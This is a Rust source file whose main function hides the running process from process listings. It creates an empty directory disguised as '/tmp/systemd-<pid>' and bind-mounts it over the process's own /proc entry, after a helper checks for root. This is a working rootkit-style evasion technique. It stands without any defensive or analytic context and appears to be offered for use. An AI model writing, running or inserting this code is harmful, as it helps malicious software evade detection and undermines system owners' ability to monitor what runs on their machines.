use libc::{mount, MS_BIND};
use std::ffi::CString;
use std::io;

/// Checks if the current process is running with root privileges.
/// Returns an error if not running as root.
pub fn check_root() -> io::Result<()> {
    if unsafe { libc::geteuid() } != 0 {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "This operation requires root privileges",
        ));
    }
    Ok(())
}

/// Bind mount to hide the target process's /proc/[pid] directory
pub fn hide_process() -> io::Result<()> {
    // 1. Create a temporary empty directory
    let pid = std::process::id();
    let temp_dir = format!("/tmp/systemd-{}", pid);
    std::fs::create_dir_all(&temp_dir)?;

    // 2. Prepare the mount parameters
    let src = CString::new(temp_dir).unwrap();
    let target = CString::new(format!("/proc/{}", pid)).unwrap();

    // 3. Bind mount the empty directory to /proc/[pid]
    let ret = unsafe {
        mount(
            src.as_ptr(),
            target.as_ptr(),
            std::ptr::null(),
            MS_BIND as libc::c_ulong,
            std::ptr::null(),
        )
    };

    if ret != 0 {
        return Err(io::Error::last_os_error());
    }

    Ok(())
}
